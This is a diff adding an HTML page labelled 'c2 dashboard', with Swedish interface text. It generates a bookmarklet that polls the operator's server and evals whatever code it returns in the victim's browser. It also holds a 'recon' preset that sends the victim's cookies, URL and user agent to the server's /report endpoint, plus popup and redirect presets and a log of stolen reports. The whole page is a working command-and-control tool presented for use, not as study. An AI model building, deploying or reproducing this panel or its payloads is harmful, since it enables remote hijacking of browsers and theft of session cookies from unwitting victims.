@@ -1,0 +1,144 @@
+<!doctype html>
+<html>
+<head>
+<meta charset="utf-8">
+<title>c2 dashboard</title>
+<style>
+  body { font: 14px monospace; background: #0a0a0a; color: #0f0; padding: 20px; }
+  h1, h2 { color: #0f0; border-bottom: 1px solid #222; padding-bottom: 6px; }
+  textarea { width: 100%; height: 150px; background: #000; color: #0f0; border: 1px solid #333; padding: 10px; font-family: monospace; }
+  button { background: #111; color: #0f0; border: 1px solid #0f0; padding: 8px 16px; cursor: pointer; margin: 4px 4px 4px 0; font-family: monospace; }
+  button:hover { background: #0f0; color: #000; }
+  pre { background: #000; padding: 10px; border: 1px solid #222; max-height: 300px; overflow: auto; }
+  input { background: #000; color: #0f0; border: 1px solid #333; padding: 6px; font-family: monospace; width: 100%; }
+  .status { color: #666; font-size: 12px; }
+  .row { display: flex; gap: 20px; }
+  .col { flex: 1; }
+</style>
+</head>
+<body>
+
+<h1>c2 dashboard</h1>
+
+<div class="row">
+  <div class="col">
+    <h2>server</h2>
+    <label>server-url</label>
+    <input id="serverUrl" value="">
+    <p class="status" id="serverStatus">inte ansluten</p>
+  </div>
+  <div class="col">
+    <h2>bookmarklet</h2>
+    <textarea id="bookmarklet" readonly style="height:100px"></textarea>
+    <button onclick="copyBookmarklet()">kopiera bookmarklet</button>
+  </div>
+</div>
+
+<h2>kod att skicka</h2>
+<textarea id="code">console.log('hej kalle');
+document.title = 'hookad';</textarea>
+<button onclick="sendCode()">skicka till kalle</button>
+<button onclick="loadPreset('recon')">recon-preset</button>
+<button onclick="loadPreset('popup')">popup-preset</button>
+<button onclick="loadPreset('redirect')">redirect-preset</button>
+
+<h2>logg</h2>
+<pre id="log">väntar...</pre>
+
+<script>
+const serverUrlInput = document.getElementById('serverUrl');
+const logEl = document.getElementById('log');
+const bookmarkletEl = document.getElementById('bookmarklet');
+
+serverUrlInput.value = location.origin;
+let lastReportId = 0;
+
+function buildBookmarklet(){
+  const server = serverUrlInput.value.replace(/\/$/, '');
+  bookmarkletEl.value = `javascript:(function(){
+  var C2 = '${server}/task.js';
+  var INTERVAL = 300;
+  var last = null;
+  function poll(){
+    fetch(C2 + '?t=' + Date.now(), {cache:'no-store'})
+      .then(function(r){ return r.ok ? r.text() : null; })
+      .then(function(code){
+        if(code && code !== last){
+          last = code;
+          (0, eval)(code);
+        }
+      })
+      .catch(function(){});
+  }
+  setInterval(poll, INTERVAL);
+  poll();
+})();`;
+}
+
+serverUrlInput.addEventListener('input', buildBookmarklet);
+buildBookmarklet();
+
+function copyBookmarklet(){
+  bookmarkletEl.select();
+  document.execCommand('copy');
+  alert('bookmarklet kopierad');
+}
+
+async function sendCode(){
+  const server = serverUrlInput.value.replace(/\/$/, '');
+  const code = document.getElementById('code').value;
+  try {
+    const r = await fetch(server + '/set', { method: 'POST', body: code });
+    if(r.ok) log('skickat (' + code.length + ' tecken)');
+    else log('fel: ' + r.status);
+  } catch(e){
+    log('kunde inte nå server: ' + e.message);
+  }
+}
+
+function loadPreset(name){
+  const server = serverUrlInput.value.replace(/\/$/, '');
+  const presets = {
+    recon: `fetch('${server}/report', {
+  method: 'POST',
+  body: JSON.stringify({
+    url: location.href,
+    title: document.title,
+    cookies: document.cookie,
+    ua: navigator.userAgent,
+    time: Date.now()
+  })
+});`,
+    popup: `for(var i=0;i<5;i++){
+  setTimeout(function(){ window.open('https://example.com'); }, i * 200);
+}`,
+    redirect: `setTimeout(function(){ location.href = 'https://example.com'; }, 2000);`
+  };
+  document.getElementById('code').value = presets[name] || '';
+}
+
+function log(msg){
+  logEl.textContent = '[' + new Date().toLocaleTimeString() + '] ' + msg + '\n' + logEl.textContent;
+}
+
+setInterval(async () => {
+  const server = serverUrlInput.value.replace(/\/$/, '');
+  try {
+    const r = await fetch(server + '/reports?since=' + lastReportId);
+    if(r.ok){
+      const data = await r.json();
+      data.forEach(rep => {
+        lastReportId = Math.max(lastReportId, rep.id);
+        log('RAPPORT: ' + JSON.stringify(rep.data));
+      });
+      document.getElementById('serverStatus').textContent = 'ansluten';
+      document.getElementById('serverStatus').style.color = '#0f0';
+    }
+  } catch(e){
+    document.getElementById('serverStatus').textContent = 'inte ansluten';
+    document.getElementById('serverStatus').style.color = '#f00';
+  }
+}, 1500);
+</script>
+</body>
+</html>
